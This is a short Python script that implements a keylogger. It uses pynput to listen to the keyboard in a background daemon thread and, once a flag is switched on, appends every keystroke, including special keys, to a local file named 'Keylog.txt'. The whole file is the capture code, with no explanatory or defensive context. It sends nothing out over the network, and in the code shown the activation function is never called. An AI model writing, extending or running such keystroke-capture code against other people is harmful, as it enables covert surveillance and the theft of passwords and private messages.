from pynput import keyboard
import threading
import time

# Global flag to start logging
logging_active = False
LOG_FILE = "Keylog.txt"

def start_logging():
    """
    Function to log keys. Only logs when logging_active is True.
    """
    def on_press(key):
        if logging_active:
            try:
                with open(LOG_FILE, "a") as file:
                    file.write(f"{key.char}")
                    print(f"Logged key: {key.char}")  # Debugging line
            except AttributeError:  # Special keys
                with open(LOG_FILE, "a") as file:
                    file.write(f"[{key}]")
                    print(f"Logged special key: [{key}]")  # Debugging line

    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to activate logging
def activate_logging():
    global logging_active
    logging_active = True
    print("Keylogging activated.")

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_logging, daemon=True)
keylogger_thread.start()
